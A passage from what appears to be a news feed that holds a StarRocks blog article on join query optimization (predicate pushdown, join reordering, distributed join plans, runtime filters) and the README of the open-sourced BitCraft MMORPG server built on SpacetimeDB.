    &lt;p&gt;For predicates in the &lt;code&gt;WHERE&lt;/code&gt;¬†clause, predicate pushdown can be applied‚Äîand may enable join type transformations‚Äîwhen the following conditions are satisfied:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The join can be of any type.&lt;/item&gt;
      &lt;item&gt;The &lt;code&gt;WHERE&lt;/code&gt;predicate can be bound to one of the join inputs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;Select *  &lt;lb/&gt;From t1 Left Outer Join t2 On t1.v1 = t2.v1 &lt;lb/&gt;        Left Outer Join t3 On t2.v2 = t3.v2 &lt;lb/&gt;Where t1.v1 = 1 And t2.v1 = 2 And t3.v2 = 3;&lt;/code&gt;
    &lt;p&gt;The predicate pushdown process proceeds as follows.&lt;/p&gt;
    &lt;p&gt;Step 1 :&lt;/p&gt;
    &lt;p&gt;Push down &lt;code&gt;(t1.v1 = 1 AND t2.v1 = 2)&lt;/code&gt;¬†and¬†&lt;code&gt;(t3.v2 = 3)&lt;/code&gt;¬†separately. Since the join type transformation rules are satisfied,&lt;code&gt;(t1 LEFT OUTER JOIN t2) LEFT OUTER JOIN t3&lt;/code&gt;can be rewritten as¬†&lt;code&gt;(t1 LEFT OUTER JOIN t2) INNER JOIN t3&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Step 2:&lt;/p&gt;
    &lt;p&gt;Continue pushing down &lt;code&gt;(t1.v1 = 1)&lt;/code&gt;¬†and¬†&lt;code&gt;(t2.v1 = 2)&lt;/code&gt;. At this point,&lt;code&gt;t1 LEFT OUTER JOIN t2&lt;/code&gt;¬†can be further transformed into&lt;code&gt;t1 INNER JOIN t2&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;It is important to note that predicate pushdown rules for join predicates in the &lt;code&gt;ON&lt;/code&gt;¬†clause differ from those for the¬†&lt;code&gt;WHERE&lt;/code&gt;¬†clause. We distinguish between two cases:¬†Inner Joins¬†and¬†other join types.&lt;/p&gt;
    &lt;p&gt;Case 1: Inner Join&lt;/p&gt;
    &lt;p&gt;For Inner Joins, pushing down join predicates in the &lt;code&gt;ON&lt;/code&gt;¬†clause follows the same rules as¬†&lt;code&gt;WHERE&lt;/code&gt;¬†clause predicate pushdown. This has already been discussed above and will not be repeated here.&lt;/p&gt;
    &lt;p&gt;Case 2: Outer / Semi / Anti Joins&lt;/p&gt;
    &lt;p&gt;For Outer, Semi, and Anti Joins, predicate pushdown on &lt;code&gt;ON&lt;/code&gt;¬†clause join predicates must satisfy the following constraints, and¬†no join type transformation is allowed during the pushdown process:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The join must be a Left or Right Outer / Semi / Anti Join.&lt;/item&gt;
      &lt;item&gt;The join predicate must be bindable only to the nullable side (the right input for a Left Join, or the left input for a Right Join).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Consider the following example:&lt;/p&gt;
    &lt;code&gt;Select *  &lt;lb/&gt;From t1 Left Outer Join t2 On t1.v1 = t2.v1 And t1.v1 = 1 And t2.v1 = 2 &lt;lb/&gt;        Left Outer Join t3 On t2.v2 = t3.v2 And t3.v2 = 3;&lt;/code&gt;
    &lt;p&gt;The predicate pushdown proceeds as follows.&lt;/p&gt;
    &lt;p&gt;Step 1:&lt;/p&gt;
    &lt;p&gt;Push down the join predicate &lt;code&gt;(t3.v2 = 3)&lt;/code&gt;, which can be bound to the right input of¬†&lt;code&gt;t1 LEFT JOIN t2 LEFT JOIN t3&lt;/code&gt;. At this stage, the¬†&lt;code&gt;LEFT OUTER JOIN&lt;/code&gt;¬†cannot¬†be converted into an¬†&lt;code&gt;INNER JOIN&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Step 2:&lt;/p&gt;
    &lt;p&gt;Push down the join predicate &lt;code&gt;(t2.v1 = 2)&lt;/code&gt;, which can be bound to the right input of&lt;code&gt;t1 LEFT JOIN t2&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;However, the predicate &lt;code&gt;(t1.v1 = 1)&lt;/code&gt;¬†is bound to the left input. Pushing it down would filter rows from¬†&lt;code&gt;t1&lt;/code&gt;, violating the semantics of a¬†&lt;code&gt;LEFT OUTER JOIN&lt;/code&gt;. Therefore, this predicate¬†cannot be pushed down.&lt;/p&gt;
    &lt;head rend="h3"&gt;2.3 Predicate Extraction&lt;/head&gt;
    &lt;p&gt;In the predicate pushdown rules discussed earlier, only predicates with conjunctive semantics can be pushed down. For example, in &lt;code&gt;t1.v1 = 1 AND t2.v1 = 2 AND t3.v2 = 3&lt;/code&gt;, each sub-predicate is connected by conjunction, making pushdown straightforward. However, predicates with¬†disjunctive semantics, such as&lt;code&gt;t1.v1 = 1 OR t2.v1 = 2 OR t3.v2 = 3&lt;/code&gt;, cannot be pushed down directly.&lt;/p&gt;
    &lt;p&gt;In real-world queries, disjunctive predicates are quite common. To address this, StarRocks introduces an optimization called predicate extraction (column value derivation). This technique derives conjunctive predicates from disjunctive ones by performing a series of union and intersection operations on column value ranges. The derived conjunctive predicates can then be pushed down to reduce join input size.&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;-- Before predicate extraction&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4);&lt;/code&gt;
    &lt;p&gt;Using column value derivation on &lt;code&gt;(t2.v1 = 2 AND t1.v2 = 3) OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)&lt;/code&gt;, the optimizer can extract the following predicates:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;t2.v1 &amp;gt;= 2&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;t1.v2 IN (3, 4)&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The query can then be rewritten as:&lt;/p&gt;
    &lt;code&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)AND t2.v1 &amp;gt;= 2&lt;lb/&gt;AND t1.v2 IN (3, 4);&lt;/code&gt;
    &lt;p&gt;It is important to note that the extracted predicates may form a superset of the original predicate ranges. As a result, they cannot safely replace the original predicates and must instead be applied in addition to them.&lt;/p&gt;
    &lt;head rend="h3"&gt;2.4 Equivalence Derivation&lt;/head&gt;
    &lt;p&gt;In addition to predicate extraction, another important predicate-level optimization is equivalence derivation. This technique leverages join equality conditions to infer value constraints on one side of the join from predicates applied to the other side.&lt;/p&gt;
    &lt;p&gt;Specifically, based on the join condition, value ranges on columns from the left table can be used to derive corresponding value ranges on columns from the right table, and vice versa.&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;-- Original SQL&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)&lt;lb/&gt;   OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4);&lt;/code&gt;
    &lt;p&gt;Using predicate extraction on &lt;code&gt;(t2.v1 = 2 AND t1.v2 = 3) OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)&lt;/code&gt;, the optimizer can derive the following predicates:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;t2.v1 &amp;gt;= 2&lt;/code&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;code&gt;t1.v2 IN (3, 4)&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Resulting in:&lt;/p&gt;
    &lt;code&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)&lt;lb/&gt;   OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)&lt;lb/&gt;  AND t2.v1 &amp;gt;= 2&lt;lb/&gt;  AND t1.v2 IN (3, 4);&lt;/code&gt;
    &lt;p&gt;Next, using the join predicate &lt;code&gt;(t1.v1 = t2.v1)&lt;/code&gt;¬†together with¬†&lt;code&gt;t2.v1 &amp;gt;= 2&lt;/code&gt;, equivalence derivation can infer an additional predicate:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;code&gt;t1.v1 &amp;gt;= 2&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The query can therefore be further rewritten as:&lt;/p&gt;
    &lt;code&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;WHERE (t2.v1 = 2 AND t1.v2 = 3)&lt;lb/&gt;   OR (t2.v1 &amp;gt; 5 AND t1.v2 = 4)&lt;lb/&gt;  AND t2.v1 &amp;gt;= 2&lt;lb/&gt;  AND t1.v2 IN (3, 4)&lt;lb/&gt;  AND t1.v1 &amp;gt;= 2;&lt;/code&gt;
    &lt;p&gt;Applicability and Constraints&lt;/p&gt;
    &lt;p&gt;The scope of equivalence derivation is more limited than predicate extraction. Predicate extraction can be applied to arbitrary predicates, whereas equivalence derivation, like predicate pushdown, has different constraints depending on the join type. As before, we distinguish between &lt;code&gt;WHERE&lt;/code&gt;¬†predicates and¬†&lt;code&gt;ON&lt;/code&gt;¬†clause join predicates.&lt;/p&gt;
    &lt;p&gt;For &lt;code&gt;WHERE&lt;/code&gt;¬†predicates:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;There are almost no restrictions. Predicates can be derived from the left table to the right table and vice versa.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For &lt;code&gt;ON&lt;/code&gt;¬†clause join predicates:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;For Inner Joins, the rules are the same as for &lt;code&gt;WHERE&lt;/code&gt;predicates‚Äîno additional constraints apply.&lt;/item&gt;
      &lt;item&gt;For join types other than Inner Join, only Semi Joins and Outer Joins are supported, and derivation is one-directional only, opposite to the join direction:&lt;/item&gt;
      &lt;item&gt;For a Left Outer Join, predicates can be derived from the left table to the right table.&lt;/item&gt;
      &lt;item&gt;For a Right Outer Join, predicates can be derived from the right table to the left table.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Why Is Equivalence Derivation One-Directional for Outer / Semi Joins?&lt;/p&gt;
    &lt;p&gt;The reason is straightforward. Consider a Left Outer Join. As discussed in predicate pushdown rules, only predicates on the right table can be pushed down; predicates on the left table cannot, as doing so would violate the semantics of a left outer join.&lt;/p&gt;
    &lt;p&gt;For the same reason, predicates derived from the right table and applied to the left table must also respect this constraint. In practice, such derived predicates on the preserved side do not help filter data early and instead introduce additional evaluation overhead. Therefore, equivalence derivation for Outer and Semi Joins is intentionally restricted to a single direction.&lt;/p&gt;
    &lt;p&gt;Implementation Details&lt;/p&gt;
    &lt;p&gt;StarRocks implements equivalence derivation by maintaining two internal maps:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;One map tracks column-to-column equivalence relationships.&lt;/item&gt;
      &lt;item&gt;The other map tracks column-to-value or column-to-expression equivalences.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;By performing lookups and inference across these two maps, the optimizer derives additional equivalent predicates. The overall mechanism is illustrated below:&lt;/p&gt;
    &lt;head rend="h3"&gt;2.5 Limit Pushdown&lt;/head&gt;
    &lt;p&gt;In addition to predicates, &lt;code&gt;LIMIT&lt;/code&gt;¬†clauses can also be pushed down through joins. When a query involves an¬†Outer Join¬†or a¬†Cross Join, the¬†&lt;code&gt;LIMIT&lt;/code&gt;¬†can be pushed down to child operators whose output row count is guaranteed to be stable.&lt;/p&gt;
    &lt;p&gt;For example, in a Left Outer Join, the output row count is at least the same as that of the left input. Therefore, the &lt;code&gt;LIMIT&lt;/code&gt;¬†can be pushed down to the left table (and symmetrically for a Right Outer Join).&lt;/p&gt;
    &lt;code&gt;-- Before pushdown&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM t1 LEFT OUTER JOIN t2 ON t1.v1 = t2.v1&lt;lb/&gt;LIMIT 100;&lt;lb/&gt;&lt;lb/&gt;-- After pushdown&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM (SELECT * FROM t1 LIMIT 100) t&lt;lb/&gt;LEFT OUTER JOIN t2 ON t.v1 = t2.v1&lt;lb/&gt;LIMIT 100;&lt;/code&gt;
    &lt;head rend="h3"&gt;Special Cases: Cross Join and Full Outer Join&lt;/head&gt;
    &lt;p&gt;A Cross Join produces a Cartesian product, with output cardinality equal to&lt;code&gt;rows(left) √ó rows(right)&lt;/code&gt;. A Full Outer Join produces at least&lt;code&gt;rows(left) + rows(right)&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;For these join types, a &lt;code&gt;LIMIT&lt;/code&gt;¬†can be pushed down to both inputs independently:&lt;/p&gt;
    &lt;code&gt;-- Before pushdown&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM t1 JOIN t2&lt;lb/&gt;LIMIT 100;&lt;lb/&gt;&lt;lb/&gt;-- After pushdown&lt;lb/&gt;SELECT *&lt;lb/&gt;FROM (SELECT * FROM t1 LIMIT 100) x1&lt;lb/&gt;JOIN (SELECT * FROM t2 LIMIT 100) &lt;lb/&gt;LIMIT 100;&lt;/code&gt;
    &lt;head rend="h2"&gt;Join Reordering&lt;/head&gt;
    &lt;p&gt;Join reordering is used to determine the execution order of multi-table joins. The optimizer aims to execute high-selectivity joins as early as possible, thereby reducing the size of intermediate results and improving overall query performance.&lt;/p&gt;
    &lt;p&gt;In StarRocks, join reordering primarily operates on continuous sequences of Inner Joins or Cross Joins. As illustrated below, StarRocks groups a sequence of consecutive Inner / Cross Joins into a Multi Join Node. A Multi Join Node is the basic unit for join reordering: if a query plan contains multiple such nodes, StarRocks performs join reordering independently for each one.&lt;/p&gt;
    &lt;p&gt;There are many join reordering algorithms in the industry, often based on different optimization models, including:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Heuristic-based approaches: Rely on predefined rules, such as those used in MemSQL, where join order is determined around dimension tables and fact tables.&lt;/item&gt;
      &lt;item&gt;Left-Deep Trees: Restrict plans to left-deep trees, significantly reducing the search space, though the resulting plan is not always optimal.&lt;/item&gt;
      &lt;item&gt;Bushy Trees: Allow fully bushy join trees, resulting in a much larger search space that includes the optimal plan. Common reordering algorithms under this model include:&lt;/item&gt;
      &lt;item&gt;Exhaustive search (based on commutativity and associativity)&lt;/item&gt;
      &lt;item&gt;Greedy algorithms&lt;/item&gt;
      &lt;item&gt;Simulated annealing&lt;/item&gt;
      &lt;item&gt;Dynamic programming (e.g., DPsize, DPsub, DPccp)&lt;/item&gt;
      &lt;item&gt;Genetic algorithms (e.g., Greenplum)&lt;/item&gt;
      &lt;item&gt;‚Ä¶‚Ä¶&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;StarRocks currently implements several join reordering strategies, including Left-Deep, Exhaustive, Greedy, and DPsub. In the following sections, we focus on the implementation details of Exhaustive and Greedy join reordering in StarRocks.&lt;/p&gt;
    &lt;head rend="h3"&gt;3.1 Exhaustive&lt;/head&gt;
    &lt;p&gt;The exhaustive join reordering algorithm is based on systematically enumerating all possible join orders. In practice, this is achieved through two fundamental rules, which together cover nearly the entire space of join permutations.&lt;/p&gt;
    &lt;p&gt;Rule 1: Join Commutativity&lt;/p&gt;
    &lt;p&gt;A join between two relations can be reordered by swapping its inputs:&lt;code&gt;A JOIN B ‚Üí B JOIN A&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;During this transformation, the join type must be adjusted accordingly. For example, a &lt;code&gt;LEFT OUTER JOIN&lt;/code&gt;¬†becomes a¬†&lt;code&gt;RIGHT OUTER JOIN&lt;/code&gt;¬†after swapping the join operands.&lt;/p&gt;
    &lt;p&gt;Rule 2: Join Associativity&lt;/p&gt;
    &lt;p&gt;Join associativity allows the join order among three relations to be rearranged:&lt;code&gt;(A JOIN B) JOIN C ‚Üí A JOIN (B JOIN C)&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;In StarRocks, associativity is handled differently depending on the join type. Specifically, StarRocks distinguishes between:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Associativity for Inner / Cross Joins&lt;/item&gt;
      &lt;item&gt;Associativity for Semi Joins&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;3.2 Greedy&lt;/head&gt;
    &lt;p&gt;For its greedy join reordering strategy, StarRocks primarily draws inspiration from multi-sequence greedy algorithms, with a small but important enhancement: at each iteration level, instead of keeping only a single best result, StarRocks retains the top 10 candidate plans (which may not be globally optimal). These candidates are then carried forward into the next iteration, ultimately producing 10 greedy-optimized plans.&lt;/p&gt;
    &lt;p&gt;Due to the inherent limitations of greedy algorithms, this approach does not guarantee a globally optimal plan. However, by preserving multiple high-quality candidates at each step, it significantly increases the likelihood of finding a near-optimal or optimal solution.&lt;/p&gt;
    &lt;head rend="h3"&gt;3.3 Cost Model&lt;/head&gt;
    &lt;p&gt;StarRocks uses these join reordering algorithms to generate N candidate plans. It then evaluates them with a cost model that estimates the cost of each join. The overall cost is computed as: Join Cost = CPU √ó (Row(L) + Row(R)) + Memory √ó Row(R)&lt;/p&gt;
    &lt;p&gt;Here, &lt;code&gt;Row(L)&lt;/code&gt;¬†and¬†&lt;code&gt;Row(R)&lt;/code&gt;¬†are the estimated output row counts of the join‚Äôs left and right children, respectively. This formula primarily accounts for the CPU cost of processing both inputs, as well as the memory cost of building the hash table on the right side of a hash join. The figure below shows how StarRocks estimates join output row counts in more detail.&lt;/p&gt;
    &lt;p&gt;Because different join reordering algorithms explore search spaces of varying sizes and have different time complexities, StarRocks benchmarks their execution time and complexity characteristics, as shown below.&lt;/p&gt;
    &lt;p&gt;Based on the observed execution costs, StarRocks applies practical limits to how different join reordering algorithms are used:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;For joins involving up to 4 tables, StarRocks uses the exhaustive algorithm.&lt;/item&gt;
      &lt;item&gt;For joins with 4‚Äì10 tables, StarRocks generates:&lt;/item&gt;
      &lt;item&gt;1 plan using the left-deep strategy,&lt;/item&gt;
      &lt;item&gt;10 plans using the greedy algorithm,&lt;/item&gt;
      &lt;item&gt;1 plan using dynamic programming.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;On top of these, StarRocks further explores additional plans using join commutativity.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;For joins with more than 10 tables, StarRocks relies only on the greedy and left-deep strategies, producing a total of 11 candidate plans as the basis for reordering.&lt;/item&gt;
      &lt;item&gt;When statistics are unavailable, cost-based greedy and dynamic programming approaches become unreliable. In this case, StarRocks falls back to using a single left-deep plan as the basis for join reordering.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Distributed Join Planning&lt;/head&gt;
    &lt;p&gt;After covering the logical optimizations involved in join queries, we now turn to join execution in a distributed environment, focusing on how StarRocks optimizes distributed join planning as a distributed database.&lt;/p&gt;
    &lt;head rend="h3"&gt;4.1 MPP Parallel Execution&lt;/head&gt;
    &lt;p&gt;StarRocks is built on an MPP (Massively Parallel Processing) execution framework. The overall architecture is illustrated below. Using a simple join query as an example, the execution of &lt;code&gt;A JOIN B&lt;/code&gt;¬†in StarRocks typically proceeds as follows:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Data from tables A and B is read in parallel from different nodes, based on their respective data distributions.&lt;/item&gt;
      &lt;item&gt;According to the join predicate, data from A and B is reshuffled so that matching rows are sent to the same set of nodes.&lt;/item&gt;
      &lt;item&gt;The join is executed locally on each node, and the partial results are produced.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As shown, query execution usually involves multiple sets of machines: the nodes reading table A, the nodes reading table B, and the nodes performing the join are not necessarily the same. As a result, execution inevitably involves network transfers and data exchanges.&lt;/p&gt;
    &lt;p&gt;These network operations introduce significant overhead. Therefore, a key goal in optimizing distributed join execution in StarRocks is to minimize network cost, while more intelligently partitioning and distributing the query plan to fully leverage the benefits of parallel execution.&lt;/p&gt;
    &lt;head rend="h3"&gt;4.2 Distributed Join Optimization&lt;/head&gt;
    &lt;p&gt;We begin by introducing the distributed execution plans that StarRocks can generate. Using a simple join query as an example:&lt;/p&gt;
    &lt;code&gt;Select * From A Join B on A.a = B.b&lt;/code&gt;
    &lt;p&gt;In practice, StarRocks can generate five basic types of distributed join plans:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Shuffle Join Data from both tables A and B is shuffled based on the join key so that matching rows are sent to the same set of nodes, where the join is then executed.&lt;/item&gt;
      &lt;item&gt;Broadcast Join The entire table B is broadcast to all nodes that hold table A, and the join is performed locally on those nodes. Compared to a shuffle join, this avoids shuffling table A, but requires broadcasting all of table B. This strategy is suitable when B is a small table.&lt;/item&gt;
      &lt;item&gt;Bucket Shuffle Join An optimization over broadcast join. Instead of broadcasting table B to all nodes, B is shuffled according to A‚Äôs data distribution and sent only to the corresponding nodes that hold matching buckets of A. Globally, the shuffled data from B exists only once, significantly reducing network traffic compared to broadcast join. This strategy has an important constraint: the join key must be consistent with A‚Äôs distribution key.&lt;/item&gt;
      &lt;item&gt;Colocate Join When tables A and B are created within the same colocate group, their data distributions are guaranteed to be identical. If the join key matches the distribution key, StarRocks can execute the join directly on the local nodes holding A and B, without any data shuffle.&lt;/item&gt;
      &lt;item&gt;Replicate Join An experimental feature in StarRocks. If every node holding table A also contains a full copy of table B, the join can be executed locally. This approach has very strict requirements ‚Äî essentially requiring the replication factor of table B to match the total number of nodes in the cluster ‚Äî making it impractical in most real-world scenarios.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;4.3 Exploring Distributed Join Plans&lt;/head&gt;
    &lt;p&gt;StarRocks derives distributed join plans through distribution property inference. Using a shuffle join as an example:&lt;code&gt;SELECT * FROM A JOIN B ON A.a = B.b&lt;/code&gt;, the join operator propagates shuffle requirements top-down to tables A and B. If a scan node cannot satisfy the required distribution, StarRocks inserts an Enforce operator to introduce a shuffle. In the final execution plan, this shuffle is translated into an Exchange node responsible for network data transfer.&lt;/p&gt;
    &lt;p&gt;Other distributed join strategies are derived in the same way: the join operator requests different distribution properties from its input operators, and the optimizer generates the corresponding distributed execution plans accordingly.&lt;/p&gt;
    &lt;head rend="h3"&gt;4.4 Complex Distributed Joins&lt;/head&gt;
    &lt;p&gt;In real-world workloads, user queries are far more complex than a simple &lt;code&gt;A JOIN B&lt;/code&gt;. They often involve three or more tables. For such queries, StarRocks generates a richer set of distributed execution plans, all derived from the same fundamental join strategies described earlier.&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;code&gt;Select * From A Join B on A.a = B.b Join C on A.a = C.c&lt;/code&gt;
    &lt;p&gt;Using combinations of Shuffle Join and Broadcast Join, StarRocks can derive multiple distributed plans, as illustrated below.&lt;/p&gt;
    &lt;p&gt;If Colocate Join and Bucket Shuffle Join are also considered, even more execution plans become possible:&lt;/p&gt;
    &lt;p&gt;Despite their increased complexity, the underlying derivation logic remains the same. Distribution properties are propagated downward through the plan tree, allowing the optimizer to infer different combinations of distributed join strategies.&lt;/p&gt;
    &lt;head rend="h3"&gt;4.5 Global Runtime Filters&lt;/head&gt;
    &lt;p&gt;Beyond exploring distributed execution plans, StarRocks further optimizes join performance by leveraging the execution characteristics of join operators to build Global Runtime Filters.&lt;/p&gt;
    &lt;p&gt;The execution flow of a Hash Join in StarRocks is as follows:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Retrieve the complete data set from the right table.&lt;/item&gt;
      &lt;item&gt;Build a hash table from the right table.&lt;/item&gt;
      &lt;item&gt;Fetch data from the left table.&lt;/item&gt;
      &lt;item&gt;Probe the hash table to evaluate join conditions.&lt;/item&gt;
      &lt;item&gt;Produce the join results.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Global Runtime Filters are applied between Step 2 and Step 3. After constructing the hash table on the right side, StarRocks derives runtime filter predicates from the observed data and pushes these filters down to the scan nodes of the left table before left-side data is read. This allows the left table to filter out irrelevant rows early, significantly reducing join input size.&lt;/p&gt;
    &lt;p&gt;At present, Global Runtime Filters in StarRocks support the following filtering techniques: Min/Max filters, IN predicates, and Bloom filters. The diagram below illustrates how these filters work in practice.&lt;/p&gt;
    &lt;head rend="h2"&gt;Summary&lt;/head&gt;
    &lt;p&gt;This article has explored StarRocks‚Äô practical experience and ongoing work in join query optimization. All of the techniques discussed are closely aligned with the core optimization principles outlined throughout the article. When optimizing SQL queries in practice, users can also apply the following guidelines together with the features provided by StarRocks to achieve better performance:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Join operators vary significantly in performance. Prefer high-performance join types whenever possible and avoid expensive ones. Based on typical join output sizes, the rough performance ranking is: Semi Join / Anti Join &amp;gt; Inner Join &amp;gt; Outer Join &amp;gt; Full Outer Join &amp;gt; Cross Join.&lt;/item&gt;
      &lt;item&gt;For hash joins, building the hash table on a smaller input is far more efficient than building it on a large table.&lt;/item&gt;
      &lt;item&gt;In multi-table joins, execute highly selective joins first to substantially reduce the cost of subsequent joins.&lt;/item&gt;
      &lt;item&gt;Minimize the amount of data participating in joins through early filtering and pruning.&lt;/item&gt;
      &lt;item&gt;Reduce network overhead in distributed joins as much as possible to fully benefit from parallel execution.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Case Studies&lt;/head&gt;
    &lt;head rend="h3"&gt;Demandbase&lt;/head&gt;
    &lt;p&gt;By leveraging StarRocks‚Äô On-the-Fly JOIN capabilities, Demandbase successfully replaced its existing ClickHouse clusters, optimizing performance while significantly reducing costs across multiple areas.&lt;/p&gt;
    &lt;p&gt;Read the case study: Demandbase Ditches Denormalization By Switching off ClickHouse&lt;/p&gt;
    &lt;head rend="h3"&gt;Naver&lt;/head&gt;
    &lt;p&gt;NAVER modernized its data infrastructure with StarRocks by enabling scalable, real-time analytics over multi-table joins without denormalization. The case study highlights the critical role of efficient, on-the-fly join execution in supporting production-scale analytical workloads.&lt;/p&gt;
    &lt;p&gt;Read the case study: How JOIN Changed How We Approach Data Infra At NAVER&lt;/p&gt;
    &lt;head rend="h3"&gt;Shopee&lt;/head&gt;
    &lt;p&gt;Data Go is a no-code query platform where Shopee business users build queries from multiple tables. Presto struggled with complex join performance and high resource usage. When Shopee switched to StarRocks for multi-table joins, they observed 3√ó‚Äì10√ó performance improvements and a ~60% reduction in CPU usage compared with Presto on external Hive data.&lt;/p&gt;
    &lt;p&gt;Read the case study: How Shopee 3xed Their Query Performance With StarRocks&lt;/p&gt;
    &lt;p&gt;Want to dive deeper into technical details or ask questions? Join StarRocks Slack to continue the conversation!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46708351</guid><pubDate>Wed, 21 Jan 2026 17:03:31 +0000</pubDate></item><item><title>Open source server code for the BitCraft MMORPG</title><link>https://github.com/clockworklabs/BitCraftPublic</link><description>&lt;doc fingerprint="bf0242db0d7343b3"&gt;
  &lt;main&gt;
    &lt;p&gt;This repository contains the server-side code for BitCraft, a community sandbox MMORPG developed by Clockwork Labs.&lt;/p&gt;
    &lt;p&gt;BitCraft blends cooperative gameplay, city-building, crafting, exploration, and survival ‚Äî all in a single seamless world shared by players around the globe. This repository represents the first phase of our open source initiative. It is being made available for public inspection, experimentation, and contribution.&lt;/p&gt;
    &lt;p&gt;In this first phase we are only open sourcing the server side code. You can read more about our decision to open source the game here:&lt;/p&gt;
    &lt;p&gt;BitCraft is a community-driven MMORPG where players collaborate to shape a procedurally generated world. There are no fixed classes or roles ‚Äî instead, players build, craft, explore, trade, and govern together to shape their civilizations.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Game website: https://bitcraftonline.com&lt;/item&gt;
      &lt;item&gt;Steam page: https://store.steampowered.com/app/1874960/BitCraft&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This repository contains the code for running a BitCraft server. It includes game logic, state management, and server-side systems, but does not yet include the client or tools required to connect to the official game.&lt;/p&gt;
    &lt;p&gt;The server for BitCraft is built on SpacetimeDB, a real-time, reactive, backend platform designed for multiplayer game development. The BitCraft server is structured as a SpacetimeDB module, all the data is stored in spacetimeDB &lt;code&gt;tables&lt;/code&gt; and all the logic runs inside &lt;code&gt;reducers&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;The source code for SpacetimeDB itself is also available on GitHub. If you're interested in learning bout SpacetimeDB, please give the repo a star!&lt;/p&gt;
    &lt;p&gt;If you're interested in exploring the server or trying to run a minimal version locally, start with the spacetimeDB documentation:&lt;/p&gt;
    &lt;p&gt;We welcome contributions that improve correctness, stability, or player experience.&lt;/p&gt;
    &lt;p&gt;Please see CONTRIBUTING.md for details on contribution scope and process.&lt;/p&gt;
    &lt;p&gt;We truly appreciate any reporting of in game exploits. To ensure that exploits are addressed quickly and not abused by other players, we ask that you submit them to us privately using this form.&lt;/p&gt;
    &lt;p&gt;Accounts that report meaningful, previously unreported, and verified exploits will receive a unique in-game reward that cannot be obtained through normal gameplay.&lt;/p&gt;
